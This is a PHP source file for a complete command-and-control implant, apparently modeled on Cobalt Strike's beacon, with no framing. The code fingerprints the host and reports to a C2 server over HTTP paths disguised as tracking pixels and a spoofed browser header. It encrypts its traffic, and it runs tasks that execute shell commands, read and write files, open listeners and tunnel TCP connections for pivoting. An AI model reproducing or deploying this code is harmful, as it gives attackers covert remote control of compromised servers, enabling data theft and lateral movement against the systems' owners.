<?php
// unlink(__FILE__);
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(1);
@ini_set("max_execution_time", 0);
define("VISIBLE", "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\]^_`{|}~");

$Profile = array(
    "Sleep"      => 60000,
    "Jitter"     => 10,
    "C2_URL"     => "http://127.0.0.1:80",
    "PullInfo"   => array(
        "Path"   => "/visit.js /__utm.gif /pixel.gif /updates.rss",
        "Query"  => "",
        "Header" => "VXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0OyBydjo2OS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzY5LjA=",
        "Output"      => array(
            "Coding"  => "None",
            "Append"  => "",
            "Prepend" => "",
        ),
        "MetaData"    => array(
            "Store"   => "Header:Cookie",
            "Coding"  => "Base64",
            "Append"  => "",
            "Prepend" => "",
        ),
    ),
    "PushInfo"   => array(
        "Path"   => "/submit.php",
        "Query"  => "",
        "Header" => "VXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0OyBydjo2OS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzY5LjA=",
        "Output"      => array(
            "Coding"  => "None",
            "Append"  => "",
            "Prepend" => "",
        ),
        "BeaconID"    => array(
            "Store"   => "URL:id",
            "Coding"  => "None",
            "Append"  => "",
            "Prepend" => "",
        ),
    ),
    "TCP_Header" => "",
    "Public_Key" => "-----BEGIN PUBLIC KEY-----\n".wordwrap("XXXYYYZZZ", 64, "\n", true)."\n-----END PUBLIC KEY-----"
);

function TCP($Data) {
    global $BeaconID, $Tunnel, $Profile;
    $Profile["Sleep"] = 100; $Profile["Jitter"] = 0;
    $Addr = explode(":", ltrim($Profile["C2_URL"], "tcp://"), 2);
    if ($Addr[0] === "127.0.0.1" || $Addr[0] === "0.0.0.0") {
        $ln = @stream_socket_server($Profile["C2_URL"]);
        if (!$ln) { die(); }
        $Conn = @stream_socket_accept($ln);
        fwrite($Conn, $Data);
        $Tunnel[$BeaconID] = $Conn;
    } else {
        $Conn = @stream_socket_client($Profile["C2_URL"]);
        if (!$Conn) { die(); }
        fwrite($Conn, $Data);
        $Tunnel[$BeaconID] = $Conn;
    }
}

function HTTP($Method, $URL, $Header, $Body) {
    return @file_get_contents($URL, false, stream_context_create(array(
        "ssl" => array("verify_peer" => false, "verify_peer_name" => false),
        "http" => array("method" => $Method, "header" => $Header, "content" => $Body, "timeout" => 10)
    )));
}

function Pull() {
    global $BeaconID, $Tunnel, $Profile;
    usleep(rand($Profile["Sleep"]-$Profile["Sleep"]*$Profile["Jitter"]/100, $Profile["Sleep"])*1000);
    if (strpos($Profile["C2_URL"], "http") === 0) {
        $Output = $Profile["PullInfo"]["Output"];
        $Data   = HTTP("GET", GetURL("PullInfo"), GetHead("PullInfo"), null);
        $End    = is_numeric($Output["Append"]) ? $Output["Append"] : strlen($Output["Append"]);
        $Start  = is_numeric($Output["Prepend"]) ? $Output["Prepend"] : strlen($Output["Prepend"]);
        return ParsePull(Decoding($Output["Coding"], substr($Data, $Start, strlen($Data)-$Start-$End)));
    }
    if (strpos($Profile["C2_URL"], "tcp") === 0 && array_key_exists($BeaconID, $Tunnel)) {
        @fread($Tunnel[$BeaconID], strlen($Profile["TCP_Header"]));
        $Len = unpack("V", fread($Tunnel[$BeaconID], 4));
        return ParsePull(@fread($Tunnel[$BeaconID], $Len[1]));
    }
}

function Push() {
    global $Buffer, $BeaconID, $Tunnel, $Profile;
    if (strpos($Profile["C2_URL"], "http") === 0 && !empty($Buffer)) {
        $Output = $Profile["PushInfo"]["Output"];
        $Data   = $Output["Prepend"].Encoding($Output["Coding"], $Buffer).$Output["Append"];
        HTTP("POST", GetURL("PushInfo"), GetHead("PushInfo"), $Data);
    }
    if (strpos($Profile["C2_URL"], "tcp") === 0 && array_key_exists($BeaconID, $Tunnel)) {
        $Error = fwrite($Tunnel[$BeaconID], $Profile["TCP_Header"].pack("V", strlen($Buffer)));
        if ($Error === false) { die(); }
        if (!empty($Buffer)) { fwrite($Tunnel[$BeaconID], $Buffer); }
    }
    $Buffer = "";
}

function Hook() {
    global $File, $PIPE, $Tunnel, $Listen, $Profile;
    if (!empty($File)) {
        foreach ($File as $FID => $Reader) {
            if (feof($Reader)) {
                TaskList(19, pack("N", $FID));
            } else {
                $Buf = fread($Reader, 262144);
                MakePush(8, pack("N", $FID).$Buf);
            }
        } 
    }
    if (!empty($PIPE)) {
        foreach ($PIPE as $PID => $Reader) {
            if (feof($Reader)) {
                pclose($Reader);
                unset($PIPE[$PID]);
            } else {
                $Buf = fread($Reader, 4096);
                if (!empty($Buf)) {
                    MakePush(30, $Buf, true);
                }
            }
        }
    }
    if (!empty($Listen)) {
        foreach ($Listen as $Socket) {
            while (true) {
                $Conn = @stream_socket_accept($Socket, 0);
                if (!$Conn) { break; }
                @fread($Conn, strlen($Profile["TCP_Header"]));
                $Len = unpack("V", fread($Conn, 4));
                if ($Len[1] !== 132) { continue; }
                $Buf = fread($Conn, $Len[1]);
                $RID = unpack("V", substr($Buf, 0, 4));
                $Tunnel[$RID[1]] = $Conn;
                MakePush(10, pack("N", $RID[1]).pack("N", 1114112).substr($Buf, 4));
            }
        }
    }
    return true;
}

function GetURL($Map) {
    $Addr = preg_split("/,\\s*|\\s+/", $GLOBALS["Profile"]["C2_URL"]);
    $Path = preg_split("/,\\s*|\\s+/", $GLOBALS["Profile"][$Map]["Path"]);
    $URL  = parse_url($Path[array_rand($Path)]);
    $URL["query"] = ltrim($GLOBALS["Profile"][$Map]["Query"], "?");
    $Info = Padding($GLOBALS["Profile"][$Map]);
    if (strtoupper($Info[0][0]) === "URL") {
        if (count($Info[0]) === 2 && strlen($Info[0][1]) > 0) {
            parse_str($URL["query"], $Query);
            $Query[$Info[0][1]] = $Info[1];
            $URL["query"] = http_build_query($Query);
        } else {
            $URL["path"] = $URL["path"].$Info[1];
        }
    }
    return rtrim($Addr[array_rand($Addr)].$URL["path"]."?".@$URL["query"], "?");
}

function GetHead($Map) {
    global $Profile;
    if (!is_array($Profile[$Map]["Header"])) {
        $Header = base64_decode($Profile[$Map]["Header"]);
        $Profile[$Map]["Header"] = preg_split("/\r\n|\n/", $Header);
    }
    $Info = Padding($Profile[$Map]);
    if (strtoupper($Info[0][0]) === "HEADER") {
        foreach ($Profile[$Map]["Header"] as $Key => $Val) {
            if (strpos($Val, $Info[0][1].":") === 0) {
                unset($Profile[$Map]["Header"][$Key]);
            }
        }
        $Profile[$Map]["Header"][] = $Info[0][1].": ".$Info[1];
    }
    return implode("\r\n", $Profile[$Map]["Header"]);
}

function Padding($Map) {
    global $BeaconID, $MetaByte;
    if (array_key_exists("MetaData", $Map)) {
        $KeyMap = $Map["MetaData"];
        $KeyVal = Encoding($KeyMap["Coding"], $MetaByte);
    }
    if (array_key_exists("BeaconID", $Map)) {
        $KeyMap = $Map["BeaconID"];
        $KeyVal = Encoding($KeyMap["Coding"], $BeaconID);
    }
    $Info = explode(":", $KeyMap["Store"], 2);
    $Data = $KeyMap["Prepend"].$KeyVal.$KeyMap["Append"];
    return array($Info, $Data);
}

function Encoding($Mode, $Data) {
    foreach ( explode("-", $Mode) as $m ) {
        if (strtoupper($m) == "BASE64") {
            $Data = base64_encode($Data);
        } elseif (strtoupper($m) == "BASE64URL") {
            $Data = rtrim(strtr(base64_encode($Data), "+/", "-_"), "=");
        } elseif (strtoupper($m) == "NETBIOS") {
            $New = "";
            for ($i=0; $i < strlen($Data); $i++) {
                $New .= chr(((ord($Data[$i]) & 240) >> 4) + 97);
                $New .= chr((ord($Data[$i]) & 15) + 97);
            }
            $Data = $New;
        } elseif (strtoupper($m) == "NETBIOSU") {
            $New = "";
            for ($i=0; $i < strlen($Data); $i++) {
                $New .= chr(((ord($Data[$i]) & 240) >> 4) + 65);
                $New .= chr((ord($Data[$i]) & 15) + 65);
            }
            $Data = $New;
        } elseif (strtoupper($m) == "MASK") {
            $Key = substr(str_shuffle(VISIBLE), 0, 4);
            for ($i=0; $i < strlen($Data); $i++) { 
                $Data[$i] = $Data[$i] ^ $Key[$i%4];
            }
            $Data = $Key.$Data;
        }
    }
    return $Data;
}

function Decoding($Mode, $Data) {
    foreach ( array_reverse(explode("-", $Mode)) as $m ) { 
        if (strtoupper($m) == "BASE64") {
            $Data = base64_decode($Data);
        } elseif (strtoupper($m) == "BASE64URL") {
            $Data = base64_decode(strtr($Data, "-_", "+/"));
        } elseif (strtoupper($m) == "NETBIOS") {
            $New = "";
            for ($i=0; $i < strlen($Data); $i+=2) { 
                $New .= chr(((ord($Data[$i]) - 97) << 4) + (ord($Data[$i+1]) - 97));
            }
            $Data = $New;
        } elseif (strtoupper($m) == "NETBIOSU") {
            $New = "";
            for ($i=0; $i < strlen($Data); $i+=2) {
                $New .= chr(((ord($Data[$i]) - 65) << 4) + (ord($Data[$i+1]) - 65));
            }
            $Data = $New;
        } elseif (strtoupper($m) == "MASK") {
            $Key = substr($Data, 0, 4);
            $Buf = substr($Data, 4);
            for ($i=0; $i < strlen($Buf); $i++) { 
                $Buf[$i] = $Buf[$i] ^ $Key[$i%4];
            }
            $Data = $Buf;
        }
    }
    return $Data;
}

function MetaInit() {
    global $AES_Key, $HMAC_Key, $BeaconID, $MetaByte, $Profile;
    $Key      = substr(str_shuffle(VISIBLE), 0, 16);
    $SHA256   = hash("SHA256", $Key, true);
    $AES_Key  = substr($SHA256, 0, 16);
    $HMAC_Key = substr($SHA256, 16);
    $BeaconID = rand(100000000, 2147000000);
    $BeaconID = ($BeaconID & 1) === 0 ? ++$BeaconID : $BeaconID;
    $MetaByte = $Key."\xe9\xfd\xe9\xfd".pack("N", $BeaconID).pack("N", getmypid())."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".pack("V", ip2long(getHostByName(""))).php_uname("n")." (".ucfirst(PHP_OS).")\t".get_current_user()."\tPHP";
    @openssl_public_encrypt("\x00\x00\xbe\xef".pack("N", strlen($MetaByte)).$MetaByte, $MetaByte, @openssl_pkey_get_public($Profile["Public_Key"]));

    if (strpos($Profile["C2_URL"], "tcp") === 0) {
        TCP($Profile["TCP_Header"].pack("V", strlen($MetaByte)+4).pack("V", $BeaconID).$MetaByte);
    } else {
        if (HTTP("GET", GetURL("PullInfo"), GetHead("PullInfo"), null) === false) { die(); }
    }
    return true;
}

function TaskList($ID, $Data) {
    try {
        global $File, $PIPE, $Tunnel, $Listen, $Profile;
        switch ($ID) {
            case 2:
                if (PATH_SEPARATOR === ";") {
                    $CMD = "start /b cmd /c ".$Data;
                } else {
                    $CMD = $Data." &";
                }
                $Stdout = popen($CMD, "r");
                if ($Stdout !== false) {
                    $PIPE[] = $Stdout;
                }
                return;
            case 3:
                $GLOBALS["TRUE"] = false;
                return MakePush(26, "");
            case 4:
                $Sleep  = unpack("N", substr($Data, 0, 4));
                $Jitter = unpack("N", substr($Data, 4, 4));
                $Profile["Sleep"]  = $Sleep[1];
                $Profile["Jitter"] = $Jitter[1];
                return;
            case 5:
                return chdir($Data);
            case 10:
                $Len  = unpack("N", substr($Data, 0, 4));
                $Path = substr($Data, 4, $Len[1]);
                return @file_put_contents($Path, substr($Data, 4+$Len[1]), LOCK_EX);
            case 11:
                if (is_file($Data) && is_readable($Data)) {
                    $FID = rand(100000000, 999999999);
                    $File[$FID] = fopen($Data, "r");
                    return MakePush(2, pack("N", $FID).pack("N", filesize($Data)).$Data);
                } else {
                    throw new Exception("Could not open ".$Data);
                }
            case 19:
                $ID = unpack("N", $Data);
                if (array_key_exists($ID[1], $File)) {
                    fclose($File[$ID[1]]);
                    unset($File[$ID[1]]);
                    MakePush(9, $Data);
                }
                return;
            case 22:
                $ID = unpack("N", substr($Data, 0, 4));
                if (array_key_exists($ID[1], $Tunnel)) {
                    $Buf = $Profile["TCP_Header"].pack("V", strlen($Data)-4).substr($Data, 4);
                    if (fwrite($Tunnel[$ID[1]], $Buf) === false) {
                        return @TaskList(23, substr($Data, 0, 4));
                    }
                    @fread($Tunnel[$ID[1]], strlen($Profile["TCP_Header"]));
                    $Len = unpack("V", fread($Tunnel[$ID[1]], 4));
                    $Buf = fread($Tunnel[$ID[1]], $Len[1]);
                    MakePush(12, substr($Data, 0, 4).$Buf);
                }
                return;
            case 23:
                $ID = unpack("N", $Data);
                if (array_key_exists($ID[1], $Tunnel)) {
                    fclose($Tunnel[$ID[1]]);
                    unset($Tunnel[$ID[1]]);
                    MakePush(11, $Data);
                }
                return;
            case 39:
                return MakePush(19, getcwd(), true);
            case 51:
                $Port = unpack("n", $Data);
                if (array_key_exists($Port[1], $Listen)) {
                    fclose($Listen[$Port[1]]);
                    unset($Listen[$Port[1]]);
                }
                return;
            case 67:
                $Len = unpack("N", substr($Data, 0, 4));
                $Path = substr($Data, 4, $Len[1]);
                return @file_put_contents($Path, substr($Data, 4+$Len[1]), FILE_APPEND|LOCK_EX);
            case 82:
                $Port = unpack("n", $Data);
                $ln = @stream_socket_server("tcp://0.0.0.0:".$Port[1], $Status, $Error);
                if (!$ln) { throw new Exception($Error); }
                $Listen[$Port[1]] = $ln;
                return;
            case 86:
                $Host = substr($Data, 2, strlen($Data)-3);
                $Port = unpack("n", substr($Data, 0, 2));
                $Addr = sprintf("tcp://%s:%d", $Host, $Port[1]);
                $Conn = @stream_socket_client($Addr, $Status, $Error, 10);
                if (!$Conn) { throw new Exception($Error); }
                fread($Conn, strlen($Profile["TCP_Header"]));
                $Len = unpack("V", fread($Conn, 4));
                if ($Len[1] !== 132) { $Len[1] = 0; }
                $Buf = fread($Conn, $Len[1]);
                if (empty($Buf)) { return fclose($Conn); }
                $RID = unpack("V", substr($Buf, 0, 4));
                $Tunnel[$RID[1]] = $Conn;
                return MakePush(10, pack("N", $RID[1]).pack("N", 1048576).substr($Buf, 4));
            default:
                return;
        }
    } catch (Exception $Error) {
        MakePush(13, $Error->getMessage(), true);
    }
}

function MakePush($Type, $Data, $Coding = false) {
    global $AES_Key, $HMAC_Key, $Buffer, $Counter;
    if ($Coding && function_exists("mb_detect_encoding")) {
        $Mode = mb_detect_encoding($Data, array("ASCII", "GB2312", "GBK", "BIG5", "UTF-8"));
        $Data = iconv($Mode, "UTF-8//IGNORE", $Data);
    }
    $Data = pack("N", $Type).$Data;
    $Data = pack("N", ++$Counter).pack("N", strlen($Data)).$Data;
    $Data = str_pad($Data, strlen($Data)+16-strlen($Data)%16, "A");
    $Data = @openssl_encrypt($Data, "AES-128-CBC", $AES_Key, 3, "abcdefghijklmnop");
    $Sign = hash_hmac("SHA256", $Data, $HMAC_Key, true);
    $Buffer .= pack("N", strlen($Data)+16).$Data.substr($Sign, 0, 16);
}

function ParsePull($Data) {
    if (strlen($Data) < 32) { return; }
    $Data = substr($Data, 0, strlen($Data)-16);
    $Data = @openssl_decrypt($Data, "AES-128-CBC", $GLOBALS["AES_Key"], 3, "abcdefghijklmnop");
    $Len  = unpack("N", substr($Data, 4, 4));
    return substr($Data, 8, $Len[1]);
}

$TRUE = MetaInit();
while ($TRUE) {
    $Buf = Pull();
    for ($i=0; $i<strlen($Buf); $i+=$Len[1]+8) {
        $ID = unpack("N", substr($Buf, $i, 4));
        $Len = unpack("N", substr($Buf, $i+4, 4));
        @TaskList($ID[1], substr($Buf, $i+8, $Len[1]));
    }
    Hook() && Push();
}